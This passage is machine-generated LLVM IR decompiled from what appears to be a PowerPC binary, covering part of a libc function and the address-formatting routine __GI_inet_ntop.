  %v0_1001367c = call i32 @__GI_strlen()
  store i32 %v0_1001367c, i32* %r3.global-to-local, align 4
  %v1_10013680 = load i32, i32* @r30, align 4
  %v3_10013680 = icmp ugt i32 %v0_1001367c, %v1_10013680
  br i1 %v3_10013680, label %dec_label_pc_10013688, label %dec_label_pc_1001369c

dec_label_pc_10013688:                            ; preds = %dec_label_pc_10013668
  %v0_10013688 = call i32 @__errno_location()
  store i32 %v0_10013688, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10013694 = inttoptr i32 %v0_10013688 to i32*
  store i32 28, i32* %v2_10013694, align 4
  %v0_100136b0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100136ac

dec_label_pc_1001369c:                            ; preds = %dec_label_pc_10013668
  %v0_1001369c = load i32, i32* @r29, align 4
  store i32 %v0_1001369c, i32* %r3.global-to-local, align 4
  store i32 %v2_10013668, i32* %r4.global-to-local, align 4
  %v2_100136a4 = bitcast i16* %stack_var_-56 to i8*
  %v3_100136a4 = call i32 @strcpy(i32 %v0_1001369c, i8* %v2_100136a4)
  store i32 %v3_100136a4, i32* %r3.global-to-local, align 4
  store i32 %v3_100136a4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100136ac

dec_label_pc_100136ac:                            ; preds = %dec_label_pc_10013688, %dec_label_pc_1001369c
  %v0_100136b0 = phi i32 [ %v0_100136b0.pre, %dec_label_pc_10013688 ], [ %v3_100136a4, %dec_label_pc_1001369c ]
  store i32 %v0_10013564, i32* %r0.global-to-local, align 4
  store i32 %v0_100136b0, i32* %r3.global-to-local, align 4
  ret i32 %v0_100136b0

; uselistorder directives
  uselistorder i32 %v0_100136b0, { 1, 0 }
  uselistorder i32 %v2_10013668, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10013664, { 1, 0 }
  uselistorder i32 %v2_10013660, { 1, 0 }
  uselistorder i32 %v0_10013634, { 1, 0, 2 }
  uselistorder i32 %v1_100135f8, { 1, 0, 2 }
  uselistorder i32 %v2_100135e8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_100135d4, { 1, 0 }
  uselistorder i32 %v0_100135c0, { 1, 0 }
  uselistorder i32 %v0_100136602, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32 15, { 0, 3, 7, 8, 1, 6, 9, 5, 2, 4 }
  uselistorder i32 268566528, { 22, 28, 25, 23, 0, 26, 27, 2, 3, 4, 5, 6, 7, 8, 9, 12, 13, 11, 14, 10, 15, 16, 17, 18, 19, 20, 21, 1, 24 }
  uselistorder label %dec_label_pc_100136ac, { 1, 0 }
  uselistorder label %dec_label_pc_10013630, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_100136c4 = icmp slt i32 %arg1, 2
  %v3_100136c4 = icmp eq i32 %arg1, 2
  store i1 %v1_100136c4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100136c4, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_100136c4, label %dec_label_pc_100136f4, label %dec_label_pc_100136e8

dec_label_pc_100136e8:                            ; preds = %entry
  %v1_100136e8 = icmp slt i32 %arg1, 10
  %v3_100136e8 = icmp eq i32 %arg1, 10
  store i1 %v1_100136e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100136e8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100136e8, label %dec_label_pc_1001372c.lr.ph, label %dec_label_pc_10013940

dec_label_pc_100136f4:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10013704.848 to i32), i32* @lr, align 4
  %v3_10013700 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_10013938

dec_label_pc_1001372c.lr.ph:                      ; preds = %dec_label_pc_100136e8
  %v2_10013708 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10013708, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001371c.849 to i32), i32* @lr, align 4
  %v3_10013718 = call i32 @__GI_memset(i32 %v2_10013708, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1001374c15 = load i32, i32* @r27, align 4
  store i32 %v0_1001374c15, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001372c

dec_label_pc_1001372c:                            ; preds = %dec_label_pc_1001372c.lr.ph, %dec_label_pc_1001372c
  %v1_10013740 = phi i32 [ 0, %dec_label_pc_1001372c.lr.ph ], [ %v1_10013750, %dec_label_pc_1001372c ]
  %v0_1001372c = phi i32 [ %v0_1001374c15, %dec_label_pc_1001372c.lr.ph ], [ %v0_1001374c, %dec_label_pc_1001372c ]
  %v0_10013734 = phi i32 [ %v0_1001374c15, %dec_label_pc_1001372c.lr.ph ], [ %v2_1001374c, %dec_label_pc_1001372c ]
  %v1_1001372c = phi i32 [ 0, %dec_label_pc_1001372c.lr.ph ], [ %v0_10013744, %dec_label_pc_1001372c ]
  %v2_1001372c = add i32 %v0_1001372c, %v1_1001372c
  %v3_1001372c = inttoptr i32 %v2_1001372c to i8*
  %v4_1001372c = load i8, i8* %v3_1001372c, align 1
  %v5_1001372c = zext i8 %v4_1001372c to i32
  %v1_10013730 = add i32 %v1_1001372c, 2
  store i32 %v1_10013730, i32* %r11.global-to-local, align 4
  %v1_10013734 = add i32 %v0_10013734, 1
  %v2_10013734 = inttoptr i32 %v1_10013734 to i8*
  %v3_10013734 = load i8, i8* %v2_10013734, align 1
  %v4_10013734 = zext i8 %v3_10013734 to i32
  %v1_10013738 = mul nuw nsw i32 %v5_1001372c, 256
  %v2_1001373c = or i32 %v4_10013734, %v1_10013738
  %v2_10013740 = load i32, i32* %r29.global-to-local, align 4
  %v3_10013740 = add i32 %v2_10013740, %v1_10013740
  %v4_10013740 = inttoptr i32 %v3_10013740 to i32*
  store i32 %v2_1001373c, i32* %v4_10013740, align 4
  %v0_10013744 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013744 = udiv i32 %v0_10013744, 2
  %v0_1001374c = load i32, i32* @r27, align 4
  %v2_1001374c = add i32 %v0_1001374c, %v0_10013744
  store i32 %v2_1001374c, i32* %r9.global-to-local, align 4
  %v1_10013750 = mul i32 %v1_10013744, 4
  %v0_10013754 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013754 = add i32 %v0_10013754, -1
  store i32 %v1_10013754, i32* %ctr.global-to-local, align 4
  %v2_10013754 = icmp eq i32 %v1_10013754, 0
  br i1 %v2_10013754, label %dec_label_pc_10013774.lr.ph, label %dec_label_pc_1001372c

dec_label_pc_10013774.lr.ph:                      ; preds = %dec_label_pc_1001372c
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10013774

dec_label_pc_10013774:                            ; preds = %dec_label_pc_10013774.lr.ph, %dec_label_pc_100137c0
  %v0_100137c4 = phi i32 [ 8, %dec_label_pc_10013774.lr.ph ], [ %v1_100137c4, %dec_label_pc_100137c0 ]
  %v0_100137b4 = phi i32 [ -1, %dec_label_pc_10013774.lr.ph ], [ %v0_100137b442, %dec_label_pc_100137c0 ]
  %v0_100137a4 = phi i32 [ -1, %dec_label_pc_10013774.lr.ph ], [ %v0_100137a439, %dec_label_pc_100137c0 ]
  %v0_10013778 = phi i32 [ -1, %dec_label_pc_10013774.lr.ph ], [ %v0_1001377835, %dec_label_pc_100137c0 ]
  %v0_100137c0 = phi i32 [ 0, %dec_label_pc_10013774.lr.ph ], [ %v1_100137c0, %dec_label_pc_100137c0 ]
  %v1_10013774 = mul i32 %v0_100137c0, 4
  %v3_10013778 = icmp eq i32 %v0_10013778, -1
  %v2_1001377c = add i32 %v1_10013774, %v2_10013708
  %v3_1001377c = inttoptr i32 %v2_1001377c to i32*
  %v4_1001377c = load i32, i32* %v3_1001377c, align 4
  %v3_10013780 = icmp eq i32 %v4_1001377c, 0
  br i1 %v3_10013780, label %dec_label_pc_10013788, label %dec_label_pc_100137a0

dec_label_pc_10013788:                            ; preds = %dec_label_pc_10013774
  br i1 %v3_10013778, label %dec_label_pc_1001378c, label %dec_label_pc_10013798

dec_label_pc_1001378c:                            ; preds = %dec_label_pc_10013788
  store i32 %v0_100137c0, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_100137c0

dec_label_pc_10013798:                            ; preds = %dec_label_pc_10013788
  %v0_10013798 = load i32, i32* @r31, align 4
  %v1_10013798 = add i32 %v0_10013798, 1
  store i32 %v1_10013798, i32* @r31, align 4
  br label %dec_label_pc_100137c0

dec_label_pc_100137a0:                            ; preds = %dec_label_pc_10013774
  br i1 %v3_10013778, label %dec_label_pc_100137c0, label %dec_label_pc_100137a4

dec_label_pc_100137a4:                            ; preds = %dec_label_pc_100137a0
  %v3_100137a4 = icmp eq i32 %v0_100137a4, -1
  %v0_100137b8.pre = load i32, i32* @r31, align 4
  %v1_100137ac = load i32, i32* @r30, align 4
  %v3_100137ac = icmp sgt i32 %v0_100137b8.pre, %v1_100137ac
  %or.cond = or i1 %v3_100137a4, %v3_100137ac
  br i1 %or.cond, label %dec_label_pc_100137b4, label %dec_label_pc_100137bc

dec_label_pc_100137b4:                            ; preds = %dec_label_pc_100137a4
  store i32 %v0_100137b4, i32* @r28, align 4
  store i32 %v0_100137b8.pre, i32* @r30, align 4
  br label %dec_label_pc_100137bc

dec_label_pc_100137bc:                            ; preds = %dec_label_pc_100137a4, %dec_label_pc_100137b4
  %v0_100137a440 = phi i32 [ %v0_100137b4, %dec_label_pc_100137b4 ], [ %v0_100137a4, %dec_label_pc_100137a4 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100137c0

dec_label_pc_100137c0:                            ; preds = %dec_label_pc_100137a0, %dec_label_pc_10013798, %dec_label_pc_1001378c, %dec_label_pc_100137bc
  %v0_100137b442 = phi i32 [ %v0_100137b4, %dec_label_pc_100137a0 ], [ %v0_100137b4, %dec_label_pc_10013798 ], [ %v0_100137c0, %dec_label_pc_1001378c ], [ -1, %dec_label_pc_100137bc ]
  %v0_1001377835 = phi i32 [ -1, %dec_label_pc_100137a0 ], [ %v0_10013778, %dec_label_pc_10013798 ], [ %v0_100137c0, %dec_label_pc_1001378c ], [ -1, %dec_label_pc_100137bc ]
  %v0_100137a439 = phi i32 [ %v0_100137a4, %dec_label_pc_100137a0 ], [ %v0_100137a4, %dec_label_pc_10013798 ], [ %v0_100137a4, %dec_label_pc_1001378c ], [ %v0_100137a440, %dec_label_pc_100137bc ]
  %v1_100137c0 = add nuw nsw i32 %v0_100137c0, 1
  store i32 %v1_100137c0, i32* %r11.global-to-local, align 4
  %v1_100137c4 = add nsw i32 %v0_100137c4, -1
  store i32 %v1_100137c4, i32* %ctr.global-to-local, align 4
  %v2_100137c4 = icmp eq i32 %v1_100137c4, 0
  br i1 %v2_100137c4, label %dec_label_pc_100137c8, label %dec_label_pc_10013774

dec_label_pc_100137c8:                            ; preds = %dec_label_pc_100137c0
  %v3_100137c8 = icmp eq i32 %v0_100137b442, -1
  %v1_100137e8 = icmp slt i32 %v0_100137a439, -1
  %v3_100137e8 = icmp eq i32 %v0_100137a439, -1
  store i1 %v1_100137e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100137e8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100137c8, label %dec_label_pc_100137e8, label %dec_label_pc_100137d0

dec_label_pc_100137d0:                            ; preds = %dec_label_pc_100137c8
  %v0_100137e0.pre = load i32, i32* @r31, align 4
  br i1 %v3_100137e8, label %dec_label_pc_100137e0, label %dec_label_pc_100137d8

dec_label_pc_100137d8:                            ; preds = %dec_label_pc_100137d0
  %v1_100137d8 = load i32, i32* @r30, align 4
  %v2_100137d8 = icmp slt i32 %v0_100137e0.pre, %v1_100137d8
  %v3_100137d8 = icmp sgt i32 %v0_100137e0.pre, %v1_100137d8
  %v4_100137d8 = icmp eq i32 %v0_100137e0.pre, %v1_100137d8
  store i1 %v2_100137d8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100137d8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100137d8, label %dec_label_pc_100137e0, label %dec_label_pc_100137e8.thread

dec_label_pc_100137e0:                            ; preds = %dec_label_pc_100137d0, %dec_label_pc_100137d8
  store i32 %v0_100137e0.pre, i32* @r30, align 4
  store i32 %v0_100137b442, i32* @r28, align 4
  br label %dec_label_pc_100137e8.thread

dec_label_pc_100137e8.thread:                     ; preds = %dec_label_pc_100137e0, %dec_label_pc_100137d8
  %v0_100137f076 = phi i32 [ %v1_100137d8, %dec_label_pc_100137d8 ], [ %v0_100137e0.pre, %dec_label_pc_100137e0 ]
  %v0_100137e8.ph = phi i32 [ %v0_100137a439, %dec_label_pc_100137d8 ], [ %v0_100137b442, %dec_label_pc_100137e0 ]
  %v1_100137e859 = icmp slt i32 %v0_100137e8.ph, -1
  %v3_100137e861 = icmp eq i32 %v0_100137e8.ph, -1
  store i1 %v1_100137e859, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100137e861, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_100137f0

dec_label_pc_100137e8:                            ; preds = %dec_label_pc_100137c8
  br i1 %v3_100137e8, label %dec_label_pc_100137fc, label %dec_label_pc_100137e8.dec_label_pc_100137f0_crit_edge

dec_label_pc_100137e8.dec_label_pc_100137f0_crit_edge: ; preds = %dec_label_pc_100137e8
  %v0_100137f0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100137f0

dec_label_pc_100137f0:                            ; preds = %dec_label_pc_100137e8.dec_label_pc_100137f0_crit_edge, %dec_label_pc_100137e8.thread
  %v0_100137f0 = phi i32 [ %v0_100137f076, %dec_label_pc_100137e8.thread ], [ %v0_100137f0.pre, %dec_label_pc_100137e8.dec_label_pc_100137f0_crit_edge ]
  %v0_100137e862 = phi i32 [ %v0_100137e8.ph, %dec_label_pc_100137e8.thread ], [ %v0_100137a439, %dec_label_pc_100137e8.dec_label_pc_100137f0_crit_edge ]
  %v1_100137f0 = icmp slt i32 %v0_100137f0, 1
  %v2_100137f0 = icmp sgt i32 %v0_100137f0, 1
  %v3_100137f0 = icmp eq i32 %v0_100137f0, 1
  store i1 %v1_100137f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100137f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100137f0, label %dec_label_pc_100137fc, label %dec_label_pc_100137f8

dec_label_pc_100137f8:                            ; preds = %dec_label_pc_100137f0
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_100137fc

dec_label_pc_100137fc:                            ; preds = %dec_label_pc_100137f0, %dec_label_pc_100137e8, %dec_label_pc_100137f8
  %v0_100138083 = phi i32 [ %v0_100137e862, %dec_label_pc_100137f0 ], [ -1, %dec_label_pc_100137e8 ], [ -1, %dec_label_pc_100137f8 ]
  %v2_100137fc = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_100137fc, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_100138084 = icmp slt i32 %v0_100138083, -1
  %v3_100138086 = icmp eq i32 %v0_100138083, -1
  store i1 %v1_100138084, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100138086, i1* %cr7_eq.global-to-local, align 1
  %v2_10013878 = icmp slt i32 %tmp, 65535
  %v4_10013878 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_10013808

dec_label_pc_10013808:                            ; preds = %dec_label_pc_100137fc, %dec_label_pc_100138d4
  %v2_10013844 = phi i32 [ %v2_100137fc, %dec_label_pc_100137fc ], [ %v2_1001382c51, %dec_label_pc_100138d4 ]
  %v0_10013818 = phi i32 [ %v0_100138083, %dec_label_pc_100137fc ], [ %v0_10013808, %dec_label_pc_100138d4 ]
  %v0_10013838 = phi i32 [ 0, %dec_label_pc_100137fc ], [ %v1_100138d4, %dec_label_pc_100138d4 ]
  %v3_100138087 = phi i1 [ %v3_100138086, %dec_label_pc_100137fc ], [ %v3_10013808, %dec_label_pc_100138d4 ]
  br i1 %v3_100138087, label %dec_label_pc_10013838, label %dec_label_pc_10013810

dec_label_pc_10013810:                            ; preds = %dec_label_pc_10013808
  %v2_10013810 = icmp slt i32 %v0_10013838, %v0_10013818
  %v4_10013810 = icmp eq i32 %v0_10013838, %v0_10013818
  br i1 %v2_10013810, label %dec_label_pc_10013838, label %dec_label_pc_10013818

dec_label_pc_10013818:                            ; preds = %dec_label_pc_10013810
  %v1_10013818 = load i32, i32* @r30, align 4
  %v2_10013818 = add i32 %v1_10013818, %v0_10013818
  %v2_1001381c = icmp slt i32 %v0_10013838, %v2_10013818
  %v4_1001381c = icmp eq i32 %v0_10013838, %v2_10013818
  store i1 %v2_1001381c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1001381c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1001381c, label %dec_label_pc_10013824, label %dec_label_pc_10013838

dec_label_pc_10013824:                            ; preds = %dec_label_pc_10013818
  br i1 %v4_10013810, label %dec_label_pc_10013828, label %dec_label_pc_100138d4

dec_label_pc_10013828:                            ; preds = %dec_label_pc_10013824
  %v3_1001382c = inttoptr i32 %v2_10013844 to i8*
  store i8 58, i8* %v3_1001382c, align 1
  %v0_10013830 = load i32, i32* %r29.global-to-local, align 4
  %v1_10013830 = add i32 %v0_10013830, 1
  store i32 %v1_10013830, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100138d4

dec_label_pc_10013838:                            ; preds = %dec_label_pc_10013818, %dec_label_pc_10013810, %dec_label_pc_10013808
  %v1_10013838 = icmp slt i32 %v0_10013838, 0
  %v3_10013838 = icmp eq i32 %v0_10013838, 0
  store i1 %v1_10013838, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013838, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013838, label %dec_label_pc_1001384c.thread, label %dec_label_pc_1001384c

dec_label_pc_1001384c.thread:                     ; preds = %dec_label_pc_10013838
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_100138b0

dec_label_pc_1001384c:                            ; preds = %dec_label_pc_10013838
  %v3_10013844 = inttoptr i32 %v2_10013844 to i8*
  store i8 58, i8* %v3_10013844, align 1
  %v0_10013848 = load i32, i32* %r29.global-to-local, align 4
  %v1_10013848 = add i32 %v0_10013848, 1
  store i32 %v1_10013848, i32* %r29.global-to-local, align 4
  %v0_1001384c.pre = load i32, i32* @r31, align 4
  %v1_1001384c = icmp slt i32 %v0_1001384c.pre, 6
  %v3_1001384c = icmp eq i32 %v0_1001384c.pre, 6
  store i1 %v1_1001384c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001384c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001384c, label %dec_label_pc_10013854, label %dec_label_pc_100138b0

dec_label_pc_10013854:                            ; preds = %dec_label_pc_1001384c
  %v0_10013854 = load i32, i32* @r28, align 4
  %v1_10013854 = icmp slt i32 %v0_10013854, 0
  %v3_10013854 = icmp eq i32 %v0_10013854, 0
  store i1 %v1_10013854, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013854, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013854, label %dec_label_pc_1001385c, label %dec_label_pc_100138b0

dec_label_pc_1001385c:                            ; preds = %dec_label_pc_10013854
  %v0_1001385c = load i32, i32* @r30, align 4
  %v1_1001385c = icmp slt i32 %v0_1001385c, 6
  %v3_1001385c = icmp eq i32 %v0_1001385c, 6
  store i1 %v1_1001385c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001385c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001385c, label %dec_label_pc_10013880, label %dec_label_pc_10013864

dec_label_pc_10013864:                            ; preds = %dec_label_pc_1001385c
  %v1_10013864 = icmp slt i32 %v0_1001385c, 5
  %v3_10013864 = icmp eq i32 %v0_1001385c, 5
  store i1 %v1_10013864, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013864, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013864, label %dec_label_pc_1001386c, label %dec_label_pc_100138b0

dec_label_pc_1001386c:                            ; preds = %dec_label_pc_10013864
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_10013878, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10013878, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10013878, label %dec_label_pc_10013880, label %dec_label_pc_100138b0

dec_label_pc_10013880:                            ; preds = %dec_label_pc_1001386c, %dec_label_pc_1001385c
  %v1_10013880 = load i32, i32* @r1, align 4
  %v2_10013880 = sub i32 %v1_10013880, %v1_10013848
  %v0_10013884 = load i32, i32* @r27, align 4
  %v1_10013884 = add i32 %v0_10013884, 12
  %v1_10013888 = add i32 %v2_10013880, 86
  store i32 ptrtoint ([3 x i8]* @global_var_10013894.850 to i32), i32* @lr, align 4
  %v3_10013890 = call i32 @inet_ntop4(i32 %v1_10013884, i32 %v1_10013848, i32 %v1_10013888)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_10013898 = icmp slt i32 %v3_10013890, 0
  %v3_10013898 = icmp eq i32 %v3_10013890, 0
  store i1 %v1_10013898, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013898, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013898, label %dec_label_pc_10013950, label %dec_label_pc_100138a0

dec_label_pc_100138a0:                            ; preds = %dec_label_pc_10013880
  %v0_100138a0 = load i32, i32* @r29, align 4
  store i32 %v0_100138a0, i32* @r3, align 4
  %v0_100138a4 = call i32 @__GI_strlen()
  %v0_100138a8 = load i32, i32* @r29, align 4
  %v2_100138a8 = add i32 %v0_100138a8, %v0_100138a4
  store i32 %v2_100138a8, i32* %r29.global-to-local, align 4
  %v0_100138e8.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100138e8

dec_label_pc_100138b0:                            ; preds = %dec_label_pc_1001384c.thread, %dec_label_pc_1001386c, %dec_label_pc_10013864, %dec_label_pc_10013854, %dec_label_pc_1001384c
  %v0_100138b067 = phi i32 [ 0, %dec_label_pc_1001384c.thread ], [ 6, %dec_label_pc_1001386c ], [ 6, %dec_label_pc_10013864 ], [ 6, %dec_label_pc_10013854 ], [ %v0_1001384c.pre, %dec_label_pc_1001384c ]
  %v0_1001388c66 = phi i32 [ %v2_10013844, %dec_label_pc_1001384c.thread ], [ %v1_10013848, %dec_label_pc_1001386c ], [ %v1_10013848, %dec_label_pc_10013864 ], [ %v1_10013848, %dec_label_pc_10013854 ], [ %v1_10013848, %dec_label_pc_1001384c ]
  %v1_100138b0 = mul i32 %v0_100138b067, 4
  store i32 %v2_10013708, i32* %r9.global-to-local, align 4
  %v2_100138b8 = add i32 %v1_100138b0, %v2_10013708
  %v3_100138b8 = inttoptr i32 %v2_100138b8 to i32*
  %v4_100138b8 = load i32, i32* %v3_100138b8, align 4
  store i32 %v0_1001388c66, i32* @r3, align 4
  store i32 268515536, i32* @lr, align 4
  %v5_100138cc = load i32, i32* @r7, align 4
  %v6_100138cc = load i32, i32* @r8, align 4
  %v9_100138cc = call i32 @sprintf(i32 %v0_1001388c66, i32 ptrtoint ([3 x i8]* @global_var_1001a53c.851 to i32), i32 %v4_100138b8, i32 %v2_10013708, i32 %v5_100138cc, i32 %v6_100138cc, i32 %v2_10013708, i32 ptrtoint (i32* @0 to i32))
  %v0_100138d0 = load i32, i32* @r29, align 4
  %v2_100138d0 = add i32 %v0_100138d0, %v9_100138cc
  store i32 %v2_100138d0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100138d4

dec_label_pc_100138d4:                            ; preds = %dec_label_pc_10013824, %dec_label_pc_10013828, %dec_label_pc_100138b0
  %v2_1001382c51 = phi i32 [ %v2_10013844, %dec_label_pc_10013824 ], [ %v1_10013830, %dec_label_pc_10013828 ], [ %v2_100138d0, %dec_label_pc_100138b0 ]
  %v0_100138d4 = load i32, i32* @r31, align 4
  %v1_100138d4 = add i32 %v0_100138d4, 1
  store i32 %v1_100138d4, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_100138d4, 8
  %v0_10013808 = load i32, i32* @r28, align 4
  %v1_10013808 = icmp slt i32 %v0_10013808, -1
  %v3_10013808 = icmp eq i32 %v0_10013808, -1
  store i1 %v1_10013808, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013808, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_10013808, label %dec_label_pc_100138e0

dec_label_pc_100138e0:                            ; preds = %dec_label_pc_100138d4
  br i1 %v3_10013808, label %dec_label_pc_10013900, label %dec_label_pc_100138e8

dec_label_pc_100138e8:                            ; preds = %dec_label_pc_100138e0, %dec_label_pc_100138a0
  %v2_100138f8 = phi i32 [ %v2_1001382c51, %dec_label_pc_100138e0 ], [ %v2_100138a8, %dec_label_pc_100138a0 ]
  %v0_100138e8 = phi i32 [ %v0_10013808, %dec_label_pc_100138e0 ], [ %v0_100138e8.pre, %dec_label_pc_100138a0 ]
  %v1_100138e8 = load i32, i32* @r30, align 4
  %v2_100138e8 = add i32 %v1_100138e8, %v0_100138e8
  %v1_100138ec = icmp slt i32 %v2_100138e8, 8
  %v3_100138ec = icmp eq i32 %v2_100138e8, 8
  store i1 %v1_100138ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100138ec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100138ec, label %dec_label_pc_100138f4, label %dec_label_pc_10013900

dec_label_pc_100138f4:                            ; preds = %dec_label_pc_100138e8
  %v3_100138f8 = inttoptr i32 %v2_100138f8 to i8*
  store i8 58, i8* %v3_100138f8, align 1
  %v0_100138fc = load i32, i32* %r29.global-to-local, align 4
  %v1_100138fc = add i32 %v0_100138fc, 1
  store i32 %v1_100138fc, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10013900

dec_label_pc_10013900:                            ; preds = %dec_label_pc_100138e8, %dec_label_pc_100138e0, %dec_label_pc_100138f4
  %v2_10013914 = phi i32 [ %v2_100138f8, %dec_label_pc_100138e8 ], [ %v2_1001382c51, %dec_label_pc_100138e0 ], [ %v1_100138fc, %dec_label_pc_100138f4 ]
  %v1_10013900 = sub i32 1, %v2_100137fc
  %v2_10013908 = add i32 %v1_10013900, %v2_10013914
  %v1_1001390c = load i32, i32* @r26, align 4
  %v2_1001390c = icmp ult i32 %v2_10013908, %v1_1001390c
  %v4_1001390c = icmp eq i32 %v2_10013908, %v1_1001390c
  store i1 %v2_1001390c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1001390c, i1* %cr7_eq.global-to-local, align 1
  %v3_10013914 = inttoptr i32 %v2_10013914 to i8*
  store i8 0, i8* %v3_10013914, align 1
  %v0_10013918 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10013918 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10013918 = or i1 %v0_10013918, %v1_10013918
  br i1 %v2_10013918, label %dec_label_pc_10013930, label %dec_label_pc_1001391c

dec_label_pc_1001391c:                            ; preds = %dec_label_pc_10013900
  %v0_1001391c = call i32 @__errno_location()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10013928 = inttoptr i32 %v0_1001391c to i32*
  store i32 28, i32* %v2_10013928, align 4
  %v0_10013954.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013950

dec_label_pc_10013930:                            ; preds = %dec_label_pc_10013900
  %v0_10013930 = load i32, i32* @r25, align 4
  %v2_10013934 = bitcast i32* %stack_var_-88 to i8*
  %v3_10013934 = call i32 @strcpy(i32 %v0_10013930, i8* %v2_10013934)
  br label %dec_label_pc_10013938

dec_label_pc_10013938:                            ; preds = %dec_label_pc_100136f4, %dec_label_pc_10013930
  %storemerge1 = phi i32 [ %v3_10013700, %dec_label_pc_100136f4 ], [ %v3_10013934, %dec_label_pc_10013930 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013950

dec_label_pc_10013940:                            ; preds = %dec_label_pc_100136e8
  %v0_10013940 = call i32 @__errno_location()
  %v2_10013948 = inttoptr i32 %v0_10013940 to i32*
  store i32 97, i32* %v2_10013948, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013950

dec_label_pc_10013950:                            ; preds = %dec_label_pc_10013880, %dec_label_pc_10013938, %dec_label_pc_1001391c, %dec_label_pc_10013940
